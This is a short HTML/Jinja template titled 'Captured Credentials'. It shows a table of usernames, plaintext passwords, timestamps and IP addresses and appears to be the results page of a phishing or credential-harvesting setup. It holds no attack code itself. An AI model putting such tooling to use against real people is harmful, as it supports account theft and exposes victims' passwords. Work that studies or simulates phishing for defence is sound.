<!DOCTYPE html>
<html>
<head>
    <title>Captured Credentials</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css">
</head>
<body class="p-4 bg-dark text-white">
    <div class="container">
        <h2 class="mb-4">📋 Captured Login Credentials</h2>
        <table class="table table-bordered table-hover table-dark">
            <thead>
                <tr>
                    <th>ID</th>
                    <th>Username</th>
                    <th>Password</th>
                    <th>Timestamp</th>
                    <th>IP Address</th>

                </tr>
            </thead>
            <tbody>
                {% for cred in credentials %}
                <tr>
                    <td>{{ cred[0] }}</td>
                    <td>{{ cred[1] }}</td>
                    <td>{{ cred[2] }}</td>
                    <td>{{ cred[3] }}</td>
                    <td>{{ cred[4] }}</td>

                </tr>
                {% endfor %}
            </tbody>
        </table>
    </div>
</body>
</html>
